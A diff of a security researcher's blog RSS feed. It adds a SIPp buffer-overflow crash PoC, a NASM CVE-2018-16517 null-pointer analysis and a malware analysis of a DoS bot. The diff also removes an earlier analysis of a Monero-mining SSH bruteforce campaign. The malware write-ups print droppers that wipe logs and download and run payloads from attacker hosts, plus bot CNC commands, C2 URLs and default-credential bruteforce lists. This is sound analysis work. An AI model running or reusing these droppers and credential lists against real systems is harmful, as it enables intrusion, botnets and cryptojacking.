@@ -3,654 +3,590 @@
   <channel>
     <title></title>
     <description>Minimalist Jekyll theme for technical writing blog.</description>
-    <link>https://heiswayi.github.io/thinkspace/</link>
-    <atom:link href="https://heiswayi.github.io/thinkspace/feed.xml" rel="self" type="application/rss+xml"/>
-    <pubDate>Sun, 02 Dec 2018 23:42:18 +0800</pubDate>
-    <lastBuildDate>Sun, 02 Dec 2018 23:42:18 +0800</lastBuildDate>
+    <link>https://fakhrizulkifli.github.io/</link>
+    <atom:link href="https://fakhrizulkifli.github.io/feed.xml" rel="self" type="application/rss+xml"/>
+    <pubDate>Sun, 02 Dec 2018 23:54:46 +0800</pubDate>
+    <lastBuildDate>Sun, 02 Dec 2018 23:54:46 +0800</lastBuildDate>
     <generator>Jekyll v3.8.5</generator>
     
       <item>
-        <title>03cc8d5deeb63e30f5a5d945abf99b00</title>
-        <description>&lt;p&gt;Initial file dropped via Bash script:&lt;/p&gt;
+        <title>Sipp_3.6</title>
+        <description>&lt;p&gt;Exploit Title: SIPp 3.6 - Local Buffer Overflow (PoC)&lt;br /&gt;
+Date: 2018-06-30&lt;br /&gt;
+Exploit Author: Fakhri Zulkifli&lt;br /&gt;
+Vendor Homepage: http://sipp.sourceforge.net/&lt;br /&gt;
+Software Link: https://github.com/SIPp/sipp/releases&lt;br /&gt;
+Version: 3.6-dev and earlier&lt;br /&gt;
+Tested on: 3.6-dev&lt;br /&gt;
+&lt;br /&gt;
+$ ./sipp -3pcc &lt;code class=&quot;highlighter-rouge&quot;&gt;python -c ‘print “A” * 300'&lt;/code&gt;&lt;br /&gt;
+&lt;br /&gt;
+#0 0x448364 in strcpy /home/user/llvm/projects/compiler-rt/lib/asan/asan_interceptors.cc:425&lt;br /&gt;
+#1 0x668d06 in main /home/user/sipp/src/sipp.cpp:1531:17&lt;br /&gt;
+#2 0x7ff5ec21282f in __libc_start_main /build/glibc-Cl5G7W/glibc-2.23/csu/../csu/libc-start.c:291&lt;br /&gt;
+#3 0x41f1a8 in _start (/home/user/sipp/sipp+0x41f1a8)&lt;br /&gt;
+&lt;br /&gt;
+$ ./sipp -i &lt;code class=&quot;highlighter-rouge&quot;&gt;python -c ‘print “A” * 300'&lt;/code&gt;&lt;br /&gt;
+&lt;br /&gt;
+#0 0x448364 in strcpy /home/user/llvm/projects/compiler-rt/lib/asan/asan_interceptors.cc:425&lt;br /&gt;
+#1 0x66a303 in main /home/user/sipp/src/sipp.cpp:1477:17&lt;br /&gt;
+#2 0x7f281302682f in __libc_start_main /build/glibc-Cl5G7W/glibc-2.23/csu/../csu/libc-start.c:291&lt;br /&gt;
+#3 0x41f1a8 in _start (/home/user/sipp/sipp+0x41f1a8)&lt;br /&gt;
+&lt;br /&gt;
+$ ./sipp -log_file &lt;code class=&quot;highlighter-rouge&quot;&gt;python -c ‘print “A” * 300'&lt;/code&gt;&lt;br /&gt;
+&lt;br /&gt;
+#0 0x448364 in strcpy /home/user/llvm/projects/compiler-rt/lib/asan/asan_interceptors.cc:425&lt;br /&gt;
+#1 0x66912f in main /home/user/sipp/src/sipp.cpp:1706:17&lt;br /&gt;
+#2 0x7f6ca663782f in __libc_start_main /build/glibc-Cl5G7W/glibc-2.23/csu/../csu/libc-start.c:291&lt;br /&gt;
+#3 0x41f1a8 in _start (/home/user/sipp/sipp+0x41f1a8)&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+</description>
+        <pubDate>Sun, 02 Dec 2018 00:00:00 +0800</pubDate>
+        <link>https://fakhrizulkifli.github.io/2018/sipp_3.6/</link>
+        <guid isPermaLink="true">https://fakhrizulkifli.github.io/2018/sipp_3.6/</guid>
+        
+        
+      </item>
+    
+      <item>
+        <title>B08f9dc5784532be5b3f695f37c7781b</title>
+        <description>&lt;p&gt;Initial file dropped:&lt;/p&gt;
 
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;
-&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; ~/
-&lt;span class=&quot;nb&quot;&gt;mkdir&lt;/span&gt; .nano
-&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; ~/.nano/
-curl &lt;span class=&quot;nt&quot;&gt;-O&lt;/span&gt; http://bookaires.com/feed/remote/nano.sh
-&lt;span class=&quot;nb&quot;&gt;chmod&lt;/span&gt; +x nano.sh
-./nano.sh
-&lt;span class=&quot;nb&quot;&gt;rm&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-rf&lt;/span&gt; /var/tmp/...
-&lt;span class=&quot;nb&quot;&gt;rm&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-rf&lt;/span&gt; /var/tmp/.bin/
-&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /var/tmp
-curl &lt;span class=&quot;nt&quot;&gt;-O&lt;/span&gt; http://bookaires.com/feed/monero.tgz
-&lt;span class=&quot;nb&quot;&gt;tar &lt;/span&gt;xvf monero.tgz
-&lt;span class=&quot;nb&quot;&gt;rm&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-rf&lt;/span&gt; monero.tgz
-&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /var/tmp/.bin/
-&lt;span class=&quot;nb&quot;&gt;chmod&lt;/span&gt; +x &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
-&lt;span class=&quot;nb&quot;&gt;nohup&lt;/span&gt; ./start &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; /dev/null &amp;amp;
-&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /tmp
-&lt;span class=&quot;nb&quot;&gt;mkdir&lt;/span&gt; .vd
-&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /tmp/.vd/
-curl &lt;span class=&quot;nt&quot;&gt;-O&lt;/span&gt; http://bookaires.com/feed/sslm.tgz
-&lt;span class=&quot;nb&quot;&gt;tar &lt;/span&gt;zxvf sslm.tgz
-&lt;span class=&quot;nb&quot;&gt;rm&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-rf&lt;/span&gt; sslm.tgz
-&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /tmp/.vd/.sslm
-./sparky.sh 192.168 &amp;amp;
-./rand &amp;amp;
-&lt;span class=&quot;nb&quot;&gt;rm&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-rf&lt;/span&gt; /tmp/min.sh
-&lt;span class=&quot;nb&quot;&gt;touch&lt;/span&gt; /tmp/hello
-&lt;span class=&quot;nb&quot;&gt;exit &lt;/span&gt;0
-&lt;span class=&quot;nb&quot;&gt;exit
-&lt;/span&gt;pkill &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; bash
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;clear ; unset ; rm -rf /var/run/utmp /var/log/wtmp /var/log/lastlog /var/log/messages /var/log/secure /var/log/xferlog /var/log/maillog /root/.bash_history ; unset HISTFILE ; unset HISTSAVE ; unset HISTLOG ; history -n ; unset WATCH ; export HISTFILE=/dev/null ; wget keedz.tk/client ; chmod +x client ; ./client ; rm -rf client ; rm -rf bash_history ; export HISTFILE=/dev/null ; rm -rf botz.sh ; exit
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;List of files contained in the &lt;code class=&quot;highlighter-rouge&quot;&gt;sslm.tgz&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;The &lt;code class=&quot;highlighter-rouge&quot;&gt;client&lt;/code&gt; is a 64-bit ELF binary. The binary acts as a DoS bot which connect to their CNC (5.135.209.121) on port 23.&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;drwxr-xr-x  0 asoftdoc asoftdoc    0 Aug 26 08:25 .sslm/
--rwxr-xr-x  0 asoftdoc asoftdoc  764 Aug 24 04:37 .sslm/rx
--rwxrwxr-x  0 asoftdoc asoftdoc  892 Aug 26 09:08 .sslm/sparky.sh
-drwxr-xr-x  0 asoftdoc asoftdoc    0 Aug 26 09:07 .sslm/tsm/
--rwxrwxr-x  0 asoftdoc asoftdoc  861 Aug 26 07:33 .sslm/tsm/a
--rwxr-xr-x  0 asoftdoc asoftdoc  170 Aug 26 07:23 .sslm/tsm/rd
--rwxr-xr-x  0 asoftdoc asoftdoc 1014456 Dec  7  2017 .sslm/tsm/tsm
--rwxrwxr-x  0 asoftdoc asoftdoc     368 Aug 26 06:43 .sslm/tsm/bclass.pl
--rwxrwxr-x  0 asoftdoc asoftdoc      54 Aug 26 08:25 .sslm/tsm/start
--rwxrwxr-x  0 asoftdoc asoftdoc 1040592 Feb  9  2017 .sslm/haiduc
--rwxrwxr-x  0 asoftdoc asoftdoc      65 Aug 26 08:27 .sslm/start
+&lt;p&gt;Available commands:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;GETLOCALIP
+SCANNER ON | OFF
+HOLD
+JUNK
+HTTP
+COMBO
+KILLATTK
+FUCKOFF
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;tsm&lt;/code&gt; is a SSH service brute force binary known as “TSM - The SSH Machine is your machine by Igor Klopov”.&lt;/p&gt;
+&lt;p&gt;Below is the connection to the CNC:&lt;/p&gt;
 
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;haiduc&lt;/code&gt; is a 64-bit ELF binary which is used to brute force, enumerate vulnerable hosts, and execute the initial dropper.&lt;/p&gt;
-
-&lt;p&gt;List of usernames and passwords:&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nginx nginx
-oracle oracle
-oracle oracle123
-developer developer
-postgres postgres
-postgres 123456
-deploy deploy
-mysql mysql
-mysql 123456
-minecraft minecraft
-minecraft 123456
-admin qwe123
-admin 123qwe
-oracle 1234
-oracle 123456
-oracle password
-root admin
-root rootroot
-root root1
-root abc@1234
-root root12
-root root123
-root root1234
-root admin123
-root admin1234
-root abc123
-root 123abc
-root password
-root P@ssw0rd
-root Q1w2e3r4
-root !QAZ2wsx
-root pass123
-root pass@123
-root pass1234
-root pass@1234
-root live
-root root
-root 1234
-root 123456
-root 12345678
-user user
-user 1234
-user 123456
-user password
-user live
-user user123
-user 12345
-user 123123
-pi raspberry
-ubuntu ubuntu
-ubuntu password
-ubuntu 1234
-ubuntu 12345
-ubuntu 123456
-ubuntu ubuntu123
-ubuntu qwerty
-ubnt ubnt
-ubnt password
-ubnt 1234
-ubnt 12345
-ubnt 123456
-ubnt ubnt123
-ubnt qwerty
-test test
-postgres posgres
-postgres password
-postgres 1234
-admin admin
-admin password
-admin 1234
-admin 123456
-guest guest
-guest password
-guest 1234
-guest 123456
-jenkins jenkins
-jenkins password
-jenkins jenkinspass
-jenkins 1234
-jenkins 123456
-hadoop hadoop
-hadoop password
-hadoop 1234
-hadoop 123456
-nagios nagios
-nagios password
-nagios 1234
-nagios 123456
-dev dev
-zabbix zabbix
-zabbix 1234
-zabbix 123456
-zabbix P@ssw0rd
-zabbix admin
-zabbix zabbix123
-zabbix zabbix1234
-zabbix password
-student student
-student student123
-ts1 ts1
-ts1 123456
-ts1 12345
-ts1 qwerty
-miner miner
-miner miner123
-miner 123456
-miner 12345
-miner 123123
-miner qwerty
-dev dev123
-dev 123123
-dev 123456
-dev qwerty
-developer developer123
-developer 123456
-developer 12345
-developer 123123
-nobody nobody
-admin qwerty
-admin admin123
-test2 test2
-patrick patrick
-julio julio
-usuario usuario
-utilizador utilizador
-utilisateur utilisateur
-administrator administrator
-administrador administrador
-administrateur administrateur
-teste teste
-tester tester
-prueba prueba
-pruebas pruebas
-testing testing
-hospede hospede
-visitor visitor
-visitante visitante
-visiteur visiteur
-kubuntu kubuntu
-lubuntu lubuntu
-xubuntu xubuntu
-lxde lxde
-superadmin superadmin
-superuser superuser
-developpeur developpeur
-deployer deployer
-support support
-suporte suporte
-soporte soporte
-etudiant etudiant
-estudante estudante
-estudiante estudiante
-teacher teacher
-prof prof
-professeur professeur
-professor professor
-profesor profesor
-server server
-serveur serveur
-servidor servidor
-amazon amazon
-csgoserver csgoserver
-dotaserver dotaserver
-wot wot
-wotserver wotserver
-username username
-ts ts
-test1 test1
-ts2 ts2
-usuario 123456
-utilizador 123456
-utilisateur 123456
-administrator 123456
-administrador 123456
-administrateur 123456
-test 123456
-teste 123456
-tester 123456
-prueba 123456
-pruebas 123456
-testing 123456
-hospede 123456
-visitor 123456
-visitante 123456
-visiteur 123456
-kubuntu 123456
-lubuntu 123456
-xubuntu 123456
-lxde 123456
-superadmin 123456
-superuser 123456
-developpeur 123456
-deploy 123456
-deployer 123456
-support 123456
-suporte 123456
-soporte 123456
-student 123456
-etudiant 123456
-estudante 123456
-estudiante 123456
-teacher 123456
-prof 123456
-professeur 123456
-professor 123456
-profesor 123456
-server 123456
-serveur 123456
-servidor 123456
-amazon 123456
-nobody 123456
-csgoserver 123456
-dotaserver 123456
-wot 123456
-wotserver 123456
-username 123456
-ts 123456
-test1 123456
-test2 123456
-ts2 123456
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Trying 5.135.209.121...
+Connected to ip121.ip-5-135-209.eu.
+Escape character is '^]'.
+!* SCANNER ON
+PING
+PONG
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;rx&lt;/code&gt; is a bash shell script used to get the information such as the brute force password list and target IP classes from the domain name &lt;code class=&quot;highlighter-rouge&quot;&gt;bookaires.com&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;If you try to connect for the 2nd time, this will be output.&lt;/p&gt;
 
-&lt;p&gt;Information hosted on &lt;code class=&quot;highlighter-rouge&quot;&gt;bookaires.com&lt;/code&gt;:&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bookaires[.]com/feed/feedp.php - password list
-bookaires[.]com/feed/class.php - IP classes
-bookaires[.]com/info.php - C2 endpoint for retrieving information from the victim
-bookaires[.]com/feed/min.sh - Binary dropper script
-bookaires[.]com/feed/remote/rinfo.php - C2 endpoint for registering new deployed miner
-bookaires[.]com/feed/ips.php - List of target IP addresses
-bookaires[.]com/feed/feedonep.php - Feed one random username and password
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Trying 5.135.209.121...
+Connected to ip121.ip-5-135-209.eu.
+Escape character is '^]'.
+!* LOLNOGTFO
+Connection closed by foreign host.
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;List of files contained in &lt;code class=&quot;highlighter-rouge&quot;&gt;monero.tgz&lt;/code&gt;:&lt;/p&gt;
+&lt;p&gt;However, the CNC can be connected again after a few seconds.&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;drwxr-xr-x  0 postgres postgres    0 Aug 27 06:32 .bin/
--rwxrwxr-x  0 postgres postgres  166 Aug 27 06:31 .bin/start
--rwxrwxr-x  0 postgres postgres 1196 Aug 27 06:29 .bin/.run
--rwxrwxr-x  0 postgres postgres  511 Aug 27 06:24 .bin/.crondsh
--rwxrwxr-x  0 postgres postgres  773 Aug 27 06:05 .bin/.config.json
--rwxr-xr-x  0 postgres postgres 2731128 Apr 27 06:10 .bin/.cnrig
--rwxr-xr-x  0 postgres postgres  838583 Apr  1  2017 .bin/.h64
--rwxrwxr-x  0 postgres postgres     773 Aug 27 06:05 .bin/.config.json.big
+&lt;p&gt;The binary spread by bruteforcing the login for a random IP addresses.&lt;/p&gt;
+
+&lt;p&gt;List of usernames:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root
+admin
+user
+login
+guest
+support
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;List of passwords:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root
+toor
+admin
+user
+guest
+login
+changeme
+1234
+12345
+123456
+default
+password
+support
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;The miner &lt;code class=&quot;highlighter-rouge&quot;&gt;cnrig&lt;/code&gt; used is compiled on April 27 2018, version 0.1.5. The binary is renamed to &lt;code class=&quot;highlighter-rouge&quot;&gt;sshd&lt;/code&gt; just before the execution.&lt;/p&gt;
+&lt;p&gt;Once logged in, it will execute the following commands:&lt;/p&gt;
 
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;h64&lt;/code&gt; is a binary known as “XHide - Process Faker, by Schizoprenic Xnuxer Research (c) 2002”&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.135.209.121/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 5.135.209.121 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 5.135.209.121; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 23 5.135.209.121 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *; exit
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;Mining server credentials:&lt;/p&gt;
+&lt;p&gt;Inside bins.sh, more binary will be fetch&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;{
-    &quot;algo&quot;: &quot;cryptonight&quot;,
-    &quot;api&quot;: {
-        &quot;port&quot;: 0,
-        &quot;access-token&quot;: null,
-        &quot;worker-id&quot;: null,
-        &quot;ipv6&quot;: false,
-        &quot;restricted&quot;: true
-    },
-    &quot;av&quot;: 0,
-    &quot;background&quot;: true,
-    &quot;colors&quot;: true,
-    &quot;cpu-priority&quot;: 0,
-    &quot;donate-level&quot;: 1,
-    &quot;log-file&quot;: null,
-    &quot;max-cpu-usage&quot;: 90,
-    &quot;pools&quot;: [
-        {
-            &quot;url&quot;: &quot;pool.supportxmr.com:5555&quot;,
-            &quot;user&quot;: &quot;42hhyPKkombM6LYEsz6kZe3d1ktHpkkD54Rtv5VZohaAbQAXzmAjkHSDZVWqMm9ieRCjMkijBYhy39ZJrYWVxKDVVqtzwPf&quot;,
-            &quot;pass&quot;: &quot;workx&quot;,
-            &quot;keepalive&quot;: true,
-            &quot;nicehash&quot;: false,
-            &quot;variant&quot;: 1
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;-e #!/bin/bash
+-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.135.209.121/ntpd; chmod +x ntpd; ./ntpd; rm -rf ntpd
+-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.135.209.121/sshd; chmod +x sshd; ./sshd; rm -rf sshd
+-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.135.209.121/openssh; chmod +x openssh; ./openssh; rm -rf openssh
+-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.135.209.121/bash; chmod +x bash; ./bash; rm -rf bash
+-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.135.209.121/tftp; chmod +x tftp; ./tftp; rm -rf tftp
+-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.135.209.121/wget; chmod +x wget; ./wget; rm -rf wget
+-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.135.209.121/cron; chmod +x cron; ./cron; rm -rf cron
+-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.135.209.121/ftp; chmod +x ftp; ./ftp; rm -rf ftp
+-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.135.209.121/pftp; chmod +x pftp; ./pftp; rm -rf pftp
+-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.135.209.121/sh; chmod +x sh; ./sh; rm -rf sh
+-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.135.209.121/' '; chmod +x ' '; ./' '; rm -rf ' '
+-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.135.209.121/apache2; chmod +x apache2; ./apache2; rm -rf apache2
+-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.135.209.121/telnetd; chmod +x telnetd; ./telnetd; rm -rf telnetd
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+</description>
+        <pubDate>Sun, 02 Dec 2018 00:00:00 +0800</pubDate>
+        <link>https://fakhrizulkifli.github.io/2018/b08f9dc5784532be5b3f695f37c7781b/</link>
+        <guid isPermaLink="true">https://fakhrizulkifli.github.io/2018/b08f9dc5784532be5b3f695f37c7781b/</guid>
+        
+        
+      </item>
+    
+      <item>
+        <title>Cve 2018 16517</title>
+        <description>&lt;p&gt;The bug is pretty much straightforward and can be triggered with a single line of assembly instruction.&lt;/p&gt;
+
+&lt;p&gt;Credit goes to &lt;a href=&quot;https://twitter.com/zeifan&quot;&gt;@zeifan&lt;/a&gt; for discovering this vulnerability by using the AFL fuzzer.&lt;/p&gt;
+
+&lt;h1 id=&quot;proof-of-crash&quot;&gt;Proof-of-Crash&lt;/h1&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1. echo &quot;equ   push  rax&quot; &amp;gt; poc
+2. nasm -f elf poc
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;typedef struct insn { /* an instruction itself */
+    char            *label;                 /* the label defined, or NULL */
+    int             prefixes[MAXPREFIX];    /* instruction prefixes, if any */
+    enum opcode     opcode;                 /* the opcode - not just the string */
+    enum ccode      condition;              /* the condition code, if Jcc/SETcc */
+    int             operands;               /* how many operands? 0-3 (more if db et al) */
+    int             addr_size;              /* address size */
+    operand         oprs[MAX_OPERANDS];     /* the operands, defined as above */
+    extop           *eops;                  /* extended operands */
+    int             eops_float;             /* true if DD and floating */
+    int32_t         times;                  /* repeat count (TIMES prefix) */
+    bool            forw_ref;               /* is there a forward reference? */
+    bool            rex_done;               /* REX prefix emitted? */
+    int             rex;                    /* Special REX Prefix */
+    int             vexreg;                 /* Register encoded in VEX prefix */
+    int             vex_cm;                 /* Class and M field for VEX prefix */
+    int             vex_wlp;                /* W, P and L information for VEX prefix */
+    uint8_t         evex_p[3];              /* EVEX.P0: [RXB,R',00,mm], P1: [W,vvvv,1,pp] */
+                                            /* EVEX.P2: [z,L'L,b,V',aaa] */
+    enum ttypes     evex_tuple;             /* Tuple type for compressed Disp8*N */
+    int             evex_rm;                /* static rounding mode for AVX512 (EVEX) */
+    int8_t          evex_brerop;            /* BR/ER/SAE operand position */
+} insn;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;static void assemble_file(const char *fname, StrList **depend_ptr)
+{
+    char *line;
+    insn output_ins;
+    int i;
+    uint64_t prev_offset_changed;
+    int64_t stall_count = 0; /* Make sure we make forward progress... */
+
+    [...]
+
+        while ((line = preproc-&amp;gt;getline())) {
+            if (++globallineno &amp;gt; nasm_limit[LIMIT_LINES])
+                nasm_fatal(0,
+                           &quot;overall line count exceeds the maximum %&quot;PRId64&quot;\n&quot;,
+                           nasm_limit[LIMIT_LINES]);
+
+            /*
+             * Here we parse our directives; this is not handled by the
+             * main parser.
+             */
+            if (process_directives(line))
+                goto end_of_line; /* Just do final cleanup */
+
+            /* Not a directive, or even something that starts with [ */
+            parse_line(pass1, line, &amp;amp;output_ins);   &amp;lt;-- [1]
+
+            if (optimizing &amp;gt; 0) {
+                if (forwref != NULL &amp;amp;&amp;amp; globallineno == forwref-&amp;gt;lineno) {
+                    output_ins.forw_ref = true;
+    [...]
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;In assemble_file function, there is an object (output_ins) to a structure (struct insn) which contains the informations regarding the opcode being parsed.
+Inside the assemble_file, a function parse_line is called in order initialize the object.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;insn *parse_line(int pass, char *buffer, insn *result)
+{
+    bool insn_is_label = false;
+    struct eval_hints hints;
+    int opnum;
+    int critical;
+    bool first;
+    bool recover;
+    int i;
+
+    nasm_static_assert(P_none == 0);
+
+restart_parse:
+    first               = true;
+    result-&amp;gt;forw_ref    = false;
+
+    stdscan_reset();
+    stdscan_set(buffer);
+    i = stdscan(NULL, &amp;amp;tokval);
+
+    memset(result-&amp;gt;prefixes, P_none, sizeof(result-&amp;gt;prefixes));
+    result-&amp;gt;times       = 1;    /* No TIMES either yet */
+    result-&amp;gt;label       = NULL; /* Assume no label */       &amp;lt;-- [2]
+    result-&amp;gt;eops        = NULL; /* must do this, whatever happens */
+    result-&amp;gt;operands    = 0;    /* must initialize this */
+    result-&amp;gt;evex_rm     = 0;    /* Ensure EVEX rounding mode is reset */
+    result-&amp;gt;evex_brerop = -1;   /* Reset EVEX broadcasting/ER op position */
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Here the structure’s member label which should be containing the definition of the label is clearly being assigned to NULL.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    [...]
+
+    if (i == TOKEN_ID || (insn_is_label &amp;amp;&amp;amp; i == TOKEN_INSN)) {    &amp;lt;-- not taken
+        /* there's a label here */
+        first = false;
+        result-&amp;gt;label = tokval.t_charptr;
+        i = stdscan(NULL, &amp;amp;tokval);
+        if (i == ':') {         /* skip over the optional colon */
+            i = stdscan(NULL, &amp;amp;tokval);
+        } else if (i == 0) {
+            nasm_error(ERR_WARNING | ERR_WARN_OL | ERR_PASS1,
+                  &quot;label alone on a line without a colon might be in error&quot;);
         }
-    ],
-    &quot;print-time&quot;: 60,
-    &quot;retries&quot;: 5,
-    &quot;retry-pause&quot;: 5,
-    &quot;safe&quot;: false,
-    &quot;syslog&quot;: false,
-    &quot;threads&quot;: null
+        if (i != TOKEN_INSN || tokval.t_integer != I_EQU) {
+            /*
+             * FIXME: location.segment could be NO_SEG, in which case
+             * it is possible we should be passing 'absolute.segment'. Look into this.
+             * Work out whether that is *really* what we should be doing.
+             * Generally fix things. I think this is right as it is, but
+             * am still not certain.
+             */
+            define_label(result-&amp;gt;label,
+                         in_absolute ? absolute.segment : location.segment,
+                         location.offset, true);
+    [...]
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;However, down to a few lines of code, there is a check before the it gets initialized with a valid value which is then skipped because the boolean insn_is_label is always FALSE.
+Therefore, the result-&amp;gt;label remains NULL.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    [...]
+
+            /*  forw_ref */
+            if (output_ins.opcode == I_EQU) {
+                if (!output_ins.label)
+                    nasm_error(ERR_NONFATAL,
+                               &quot;EQU not preceded by label&quot;);
+
+                if (output_ins.operands == 1 &amp;amp;&amp;amp;
+                    (output_ins.oprs[0].type &amp;amp; IMMEDIATE) &amp;amp;&amp;amp;
+                    output_ins.oprs[0].wrt == NO_SEG) {
+                    define_label(output_ins.label,
+                                 output_ins.oprs[0].segment,
+                                 output_ins.oprs[0].offset, false);   &amp;lt;-- [3]
+    [...]
